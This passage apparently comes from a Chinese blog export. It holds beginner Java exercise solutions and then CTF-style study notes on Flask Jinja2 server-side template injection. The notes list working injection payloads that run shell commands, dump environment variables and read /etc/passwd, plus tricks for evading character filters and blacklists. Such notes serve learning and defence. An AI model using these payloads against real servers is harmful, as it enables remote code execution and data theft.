<h3 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式:"></a>输入格式:</h3><p>在一行中给出一对整数a和b。<br>以下输入样例只有两对，实际测试数据可能有多对值。</p>
<h3 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式:"></a>输出格式:</h3><p>对每一组输入，如果a的绝对值&gt;1000，输出<code>|a|&gt;1000</code>，否则输出<code>a+b</code>的值。</p>
<h3 id="输入样例"><a href="#输入样例" class="headerlink" title="输入样例:"></a>输入样例:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">18 -299</span><br><span class="line">1001 -9</span><br><span class="line">-1001 8</span><br></pre></td></tr></table></figure>

<h3 id="输出样例"><a href="#输出样例" class="headerlink" title="输出样例:"></a>输出样例:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-281</span><br><span class="line">|a|&gt;1000</span><br><span class="line">|a|&gt;1000</span><br></pre></td></tr></table></figure>

<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (scanner.hasNextInt()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">            <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (Math.abs(a) &gt; <span class="number">1000</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;|a|&gt;1000&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(a + b);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以下是对</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (scanner.hasNextInt()) &#123;</span><br><span class="line">	<span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">	<span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码块的解释：</p>
<ul>
<li><code>while (scanner.hasNextInt())</code>: 这是一个循环，会一直执行，直到没有更多的整数可以从输入中读取。<code>scanner.hasNextInt()</code> 是一个检查，用于确定扫描器的下一个输入是否可以解释为一个整数。如果有可读取的整数，它返回 <code>true</code>，循环继续；否则返回 <code>false</code>，循环结束。</li>
<li><code>int a = scanner.nextInt();</code>: 如果 <code>hasNextInt()</code> 返回 <code>true</code>，则通过 <code>nextInt()</code> 方法读取下一个整数，并将其赋值给变量 <code>a</code>。<code>nextInt()</code> 方法从输入中读取下一个整数，然后将其从输入流中消耗掉，意味着这个整数在之后的操作中不再可用。</li>
<li><code>int b = scanner.nextInt();</code>: 在读取了 <code>a</code> 之后，程序继续读取下一个整数，并将其赋值给变量 <code>b</code>。同样，这是通过 <code>nextInt()</code> 方法实现的。</li>
</ul>
<h1 id="7-2-jmu-Java-01入门-取数字浮点数"><a href="#7-2-jmu-Java-01入门-取数字浮点数" class="headerlink" title="7-2 jmu-Java-01入门-取数字浮点数"></a>7-2 jmu-Java-01入门-取数字浮点数</h1><p>本题目要求读入若干以回车结束的字符串表示的整数或者浮点数，然后将每个数中的所有数字全部加总求和。</p>
<h3 id="输入格式-1"><a href="#输入格式-1" class="headerlink" title="输入格式:"></a>输入格式:</h3><p>每行一个整数或者浮点数。保证在浮点数范围内。</p>
<h3 id="输出格式-1"><a href="#输出格式-1" class="headerlink" title="输出格式:"></a>输出格式:</h3><p>整数或者浮点数中的数字之和。题目保证和在整型范围内。</p>
<h3 id="输入样例-1"><a href="#输入样例-1" class="headerlink" title="输入样例:"></a>输入样例:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-123.01</span><br><span class="line">234</span><br></pre></td></tr></table></figure>

<h3 id="输出样例-1"><a href="#输出样例-1" class="headerlink" title="输出样例:"></a>输出样例:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7</span><br><span class="line">9</span><br></pre></td></tr></table></figure>

<h2 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (scanner.hasNext()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">input</span> <span class="operator">=</span> scanner.next();</span><br><span class="line">            <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> c : input.toCharArray()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (Character.isDigit(c)) &#123;</span><br><span class="line">                    sum += c - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.out.println(sum);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以下是对</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">char</span> c : input.toCharArray()) &#123;</span><br><span class="line">	<span class="keyword">if</span> (Character.isDigit(c)) &#123;</span><br><span class="line">		sum += c - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码块的解释：</p>
<ul>
<li><code>for (char c : input.toCharArray())</code>：这行代码将输入字符串转换成一个字符数组，并遍历每个字符。变量 <code>c</code> 代表循环中当前的字符。</li>
<li><code>if (Character.isDigit(c))</code>：在循环内部，这行代码检查当前字符 <code>c</code> 是否是数字。<code>Character.isDigit(c)</code> 方法如果 <code>c</code> 是数字（0-9），则返回 <code>true</code>，否则返回 <code>false</code>。</li>
<li><code>sum += c - &#39;0&#39;</code>：如果 <code>c</code> 是数字，就执行这行代码。它将字符 <code>c</code> 转换为其数值整数。由于 <code>c</code> 是代表数字的字符，从 <code>c</code> 中减去 <code>&#39;0&#39;</code> 就得到了那个数字的整数值。然后，这个整数值被加到 <code>sum</code> 上。</li>
</ul>
<p>例如，如果 <code>c</code> 是字符 <code>&#39;4&#39;</code>，<code>c - &#39;0&#39;</code> 将会是 <code>52 - 48</code>（在ASCII码中，’4’ 是 52，’0’ 是 48），等于 <code>4</code>。这个值然后被加到 <code>sum</code> 上，<code>sum</code> 累积了字符串中所有数字字符的总和。</p>
<h1 id="7-3-jmu-Java-01入门-格式化输入输出与字符串"><a href="#7-3-jmu-Java-01入门-格式化输入输出与字符串" class="headerlink" title="7-3 jmu-Java-01入门-格式化输入输出与字符串"></a>7-3 jmu-Java-01入门-格式化输入输出与字符串</h1><h3 id="本题主要考察"><a href="#本题主要考察" class="headerlink" title="本题主要考察"></a>本题主要考察</h3><ul>
<li>使用<code>Scanner</code>处理输入</li>
<li>使用<code>System.out.printf</code>进行格式化输出</li>
<li><code>String</code>常用方法与字符串常用操作</li>
</ul>
<h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><h3 id="输入说明："><a href="#输入说明：" class="headerlink" title="输入说明："></a>输入说明：</h3><ul>
<li>输入<code>double</code>，然后输入3个浮点数。<strong>输出：</strong>从左到右依次输出3个double(均保留2位小数输出，宽度为5)，<strong>格式依次为：</strong>右侧填充空格，左侧填充空格，直接输出</li>
<li>输入<code>int</code>，然后输入3个整数(以1个或多个空格分隔)。<strong>输出：</strong>将3个整数相加后输出。</li>
<li>输入<code>str</code>，然后输入3个字符串。<strong>输出：</strong>去除空格，然后倒序输出3个字符。</li>
<li>输入<code>line</code>，然后输入一行字符串。<strong>输出：</strong>转换成大写后输出。</li>
<li>如果输入不是上面几个关键词，**输出:**输出**other**。</li>
</ul>
<h3 id="输出说明"><a href="#输出说明" class="headerlink" title="输出说明"></a>输出说明</h3><p><strong>choice&#x3D;你输入选项</strong><br>该选项对应的输出内容</p>
<h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><ol>
<li>可使用<code>line.split(&quot;\\s+&quot;);</code>将以1个或多个空格分隔开的字符串分割并放入字符串数组。</li>
<li><code>Scanner.nextLine</code>与Scanner的其他next函数混用有可能出错。</li>
</ol>
<h3 id="输入样例-2"><a href="#输入样例-2" class="headerlink" title="输入样例:"></a>输入样例:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">double</span><br><span class="line">1.578 3.0 3.14259</span><br><span class="line">line</span><br><span class="line">aaaaaaaaaa</span><br><span class="line">int</span><br><span class="line">1      2    3</span><br><span class="line">str</span><br><span class="line">321 654 987</span><br><span class="line">line</span><br><span class="line">dddddddddd</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<h3 id="输出样例-2"><a href="#输出样例-2" class="headerlink" title="输出样例:"></a>输出样例:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">choice=double</span><br><span class="line">1.58 , 3.00,3.14</span><br><span class="line">choice=line</span><br><span class="line">AAAAAAAAAA</span><br><span class="line">choice=int</span><br><span class="line">6</span><br><span class="line">choice=str</span><br><span class="line">987654321</span><br><span class="line">choice=line</span><br><span class="line">DDDDDDDDDD</span><br><span class="line">choice=end</span><br><span class="line">other</span><br></pre></td></tr></table></figure>

<h2 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        String choice;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (scanner.hasNext()) &#123;</span><br><span class="line">            choice = scanner.next();</span><br><span class="line">            System.out.printf(<span class="string">&quot;choice=%s\n&quot;</span>, choice);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;double&quot;</span>:</span><br><span class="line">                    <span class="type">double</span> <span class="variable">d1</span> <span class="operator">=</span> scanner.nextDouble();</span><br><span class="line">                    <span class="type">double</span> <span class="variable">d2</span> <span class="operator">=</span> scanner.nextDouble();</span><br><span class="line">                    <span class="type">double</span> <span class="variable">d3</span> <span class="operator">=</span> scanner.nextDouble();</span><br><span class="line">                    System.out.printf(<span class="string">&quot;%-5.2f,%5.2f,%.2f\n&quot;</span>, d1, d2, d3);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;int&quot;</span>:</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i1</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">                    System.out.println(i1 + i2 + i3);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;str&quot;</span>:</span><br><span class="line">                    scanner.nextLine();</span><br><span class="line">                    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> scanner.nextLine();</span><br><span class="line">                    String[] arr = str.split(<span class="string">&quot;\\s+&quot;</span>);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">                        System.out.print(arr[i]);</span><br><span class="line">                    &#125;</span><br><span class="line">                    System.out.println();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;line&quot;</span>:</span><br><span class="line">                    scanner.nextLine();</span><br><span class="line">                    <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> scanner.nextLine();</span><br><span class="line">                    System.out.println(line.toUpperCase());</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    System.out.println(<span class="string">&quot;other&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解释：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.printf(<span class="string">&quot;%-5.2f,%5.2f,%.2f\n&quot;</span>, d1, d2, d3);</span><br></pre></td></tr></table></figure>

<p><code>%-5.2f</code>：这部分指定了输出宽度和对齐方式。<code>-</code> 表示左对齐，而 5 指定了最小输出宽度为 5 个字符。这意味着如果数值转换成的字符串长度小于5个字符，输出将通过添加空格到右侧来扩展到5个字符，从而保持左对齐。如果没有-，数字默认是右对齐的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] arr = str.split(<span class="string">&quot;\\s+&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>String[] arr = str.split(&quot;\\s+&quot;);</code> 这行代码是用来将字符串 <code>str</code> 分割成字符串数组 <code>arr</code> 的。这里具体的分割依据是正则表达式 <code>\\s+</code>。</p>
<p>解析这个正则表达式：</p>
<ul>
<li><code>\\s</code> 代表空白字符，比如空格、制表符（Tab）、换行符等。</li>
<li><code>+</code> 表示前面的字符（在这里是指空白字符）出现一次或多次。</li>
</ul>
<p>综合来看，<code>\\s+</code> 匹配一连串（一个或多个连续的）空白字符。因此，这个命令会根据一个或多个连续的空白字符来分割字符串 <code>str</code>，并将分割后的结果存储在字符串数组 <code>arr</code> 中。</p>
<p>例如，如果 <code>str</code> 是 <code>&quot;hello world java programming&quot;</code>，那么执行这行代码后，<code>arr</code> 将会是一个包含四个元素的数组，分别是 <code>&quot;hello&quot;</code>, <code>&quot;world&quot;</code>, <code>&quot;java&quot;</code>, 和 <code>&quot;programming&quot;</code>。这是因为原始的字符串 <code>str</code> 被空格（它是一种空白字符）分割成了四部分。</p>
<h1 id="7-4-jmu-Java-01入门-开根号"><a href="#7-4-jmu-Java-01入门-开根号" class="headerlink" title="7-4 jmu-Java-01入门-开根号"></a>7-4 jmu-Java-01入门-开根号</h1><p>使用逐步逼近法对给定数值x求开根号。</p>
<p><strong>逐步逼近法说明</strong>：从0开始逐步累加步长值。</p>
<p>步长&#x3D;0.0001，epsilon(误差)&#x3D;0.0001</p>
<p><strong>循环继续的条件：</strong></p>
<p><code>平方值&lt;x</code> 且 <code>|x-平方值| &gt; epsilon</code></p>
<h3 id="说明与参考"><a href="#说明与参考" class="headerlink" title="说明与参考"></a>说明与参考</h3><ol>
<li>数值输出保留6位小数，使用System.out.printf(“%.6f\n”)</li>
<li>求平方，参考Math.pow函数。</li>
<li>输入值&lt;0时，返回<strong>Double.NaN</strong></li>
</ol>
<h3 id="输入格式-2"><a href="#输入格式-2" class="headerlink" title="输入格式:"></a>输入格式:</h3><p>任意数值</p>
<h3 id="输出格式-2"><a href="#输出格式-2" class="headerlink" title="输出格式:"></a>输出格式:</h3><p>对每一组输入，在一行中输出其开根号。保留6位小数</p>
<h3 id="输入样例-3"><a href="#输入样例-3" class="headerlink" title="输入样例:"></a>输入样例:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">解释-1</span><br><span class="line">0</span><br><span class="line">0.5</span><br><span class="line">0.36</span><br><span class="line">1</span><br><span class="line">6</span><br><span class="line">100</span><br><span class="line">131</span><br></pre></td></tr></table></figure>

<h3 id="输出样例-3"><a href="#输出样例-3" class="headerlink" title="输出样例:"></a>输出样例:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">解释NaN</span><br><span class="line">0.000000</span><br><span class="line">0.707100</span><br><span class="line">0.600000</span><br><span class="line">1.000000</span><br><span class="line">2.449500</span><br><span class="line">10.000000</span><br><span class="line">11.445600</span><br></pre></td></tr></table></figure>

<h2 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="keyword">while</span> (in.hasNext())&#123;</span><br><span class="line">            <span class="type">double</span> k=in.nextDouble();</span><br><span class="line">            <span class="keyword">if</span> (k&gt;<span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">double</span> m=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span> (m*m&lt;k&amp;&amp;Math.abs(k-m*m)&gt;<span class="number">0.0001</span>) &#123;</span><br><span class="line">                    m+=<span class="number">0.0001</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.printf(<span class="string">&quot;%.6f\n&quot;</span>,m);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span> (k==<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.printf(<span class="string">&quot;%.6f\n&quot;</span>,<span class="number">0.0</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;NaN\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript 漏洞学习记录</title>
    <url>/2024/04/15/JavaScript%20%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>原型链污染</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask Jinja2 SSTI 学习记录</title>
    <url>/2024/03/09/Jinja2%20SSTI/</url>
    <content><![CDATA[<h1 id="Flask-Jinja2"><a href="#Flask-Jinja2" class="headerlink" title="Flask Jinja2"></a>Flask Jinja2</h1><p>flask是使用Jinja2来作为渲染引擎的，模板文件并不是单纯的html代码，而是夹杂着模板的语法，因</p>
<p>为页面不可能都是一个样子的，有一些地方是会变化的。比如说显示用户名的地方，这个时候就需要使用模板支持的语法，来传参。</p>
<p>flask的渲染方法有render_template和render_template_string两种。</p>
<p>感觉…没什么好多说的，就是记模板</p>
<span id="more"></span>

<h2 id="模板和过滤（前提：以GET给name传参）"><a href="#模板和过滤（前提：以GET给name传参）" class="headerlink" title="模板和过滤（前提：以GET给name传参）"></a>模板和过滤（前提：以GET给name传参）</h2><h3 id="通用（并不是每一个题目都有以下几类）"><a href="#通用（并不是每一个题目都有以下几类）" class="headerlink" title="通用（并不是每一个题目都有以下几类）"></a>通用（并不是每一个题目都有以下几类）</h3><h4 id=""><a href="#" class="headerlink" title="&lt;class os.wrap_close&gt;"></a><code>&lt;class os.wrap_close&gt;</code></h4><h5 id="popen"><a href="#popen" class="headerlink" title="popen"></a><code>popen</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&quot;popen&quot;](&quot;ls /&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>讲述一些小细节：</p>
<ul>
<li><p><code>__bases__</code>后面的数字是根据实际情况，以<strong>object</strong>类出现的位数而定的（一般是<code>__bases__</code>为0，<code>__mro__</code>为1）</p>
</li>
<li><p><code>__subclasses__</code>后面的数字是根据实际情况，以<strong>os.wrap_close</strong>出现的位数而定的</p>
</li>
</ul>
<p>直接读文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__.get(&#x27;popen&#x27;)(&#x27;dir&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="builtins"><a href="#builtins" class="headerlink" title="__builtins__"></a><code>__builtins__</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__bases__.__subclasses__()[138].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>这个类有个<strong>eval</strong>内置方法就可以执行命令</p>
<p>这里有个坑，就是在执行命令的时候不能用<strong>system</strong>函数</p>
<p>因为在flask里面执行system的时候返回的是状态码，也就是看不到回显，只会回显一些数字，所以要用popen，而且最好16进制编码一下，不然容易触发黑名单，还能避免很多大大小小的错误</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get(&#x27;__builtins__&#x27;).get(&#x27;open&#x27;)(&#x27;dir&#x27;).read()&#125;&#125;</span><br><span class="line">//get()方式绕过</span><br></pre></td></tr></table></figure>

<h5 id="sys"><a href="#sys" class="headerlink" title="sys"></a><code>sys</code></h5><p>听说有用，目前还没见到</p>
<h4 id="-1"><a href="#-1" class="headerlink" title="&lt;type &#39;file&#39;&gt; "></a><code>&lt;type &#39;file&#39;&gt; </code></h4><p>读取文件类，&lt;type ‘file’&gt; file位置一般为40，直接调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[40](&#x27;fl4g&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="-2"><a href="#-2" class="headerlink" title="&lt;class &#39;site._Printer&#39;&gt;"></a><code>&lt;class &#39;site._Printer&#39;&gt;</code></h4><p>调用<code>os</code>的<code>popen</code>执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;ls /flasklight&#x27;).read()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;cat coomme_geeeett_youur_flek&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>如果system被过滤，用os的listdir读取目录+file模块读取文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="-3"><a href="#-3" class="headerlink" title="&lt;class &#39;subprocess.Popen&#39;&gt;"></a><code>&lt;class &#39;subprocess.Popen&#39;&gt;</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[258](&#x27;ls&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[258](&#x27;ls /flasklight&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[258](&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line">//读环境变量</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[245](&#x27;env&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="-4"><a href="#-4" class="headerlink" title="&lt;class &#39;warnings.catch_warnings&#39;&gt;"></a><code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#调用file</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;file&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line">#把 read() 改为 write() 就是写文件</span><br><span class="line">#调用eval</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">#调用system方法</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__.values()[12].__dict__.values()[144](&#x27;whoami&#x27;)&#125;&#125;</span><br><span class="line">#调用commands进行命令执行</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__bases__.__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;commands&#x27;).getstatusoutput(&#x27;ls /&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤_"></a>过滤<code>_</code></h4><h5 id="引号内十六进制绕过"><a href="#引号内十六进制绕过" class="headerlink" title="引号内十六进制绕过"></a>引号内十六进制绕过</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__ &#125;&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;.&quot;\x5f\x5fclass\x5f\x5f&quot; &#125;&#125;</span><br></pre></td></tr></table></figure>

<p><code>_</code>是<code>\x5f</code>，<code>.</code>是<code>\x2E</code></p>
<h4 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤[]"></a>过滤<code>[]</code></h4><h5 id="getitem"><a href="#getitem" class="headerlink" title="__getitem__()"></a><code>__getitem__()</code></h5><p><code>d[&#39;a&#39;]</code> 等价于<code>d.__getitem__(&#39;a&#39;)</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__bases__.__getitem__(&#x27;0&#x27;).__subclasses__().__getitem__(&#x27;138&#x27;).__init__.__globals__[&quot;popen&quot;](&quot;ls /&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="pop"><a href="#pop" class="headerlink" title="pop()"></a><code>pop()</code></h5><p><code>d[&#39;a&#39;]</code> 等价于<code>d.pop(&#39;a&#39;)</code></p>
<h4 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h4><h5 id="单双引号互换"><a href="#单双引号互换" class="headerlink" title="单双引号互换"></a>单双引号互换</h5><h5 id="http-get（用GET方式传入）"><a href="#http-get（用GET方式传入）" class="headerlink" title="http_get（用GET方式传入）"></a>http_get（用GET方式传入）</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get(&#x27;popen&#x27;)(&#x27;dir&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>等价于</p>
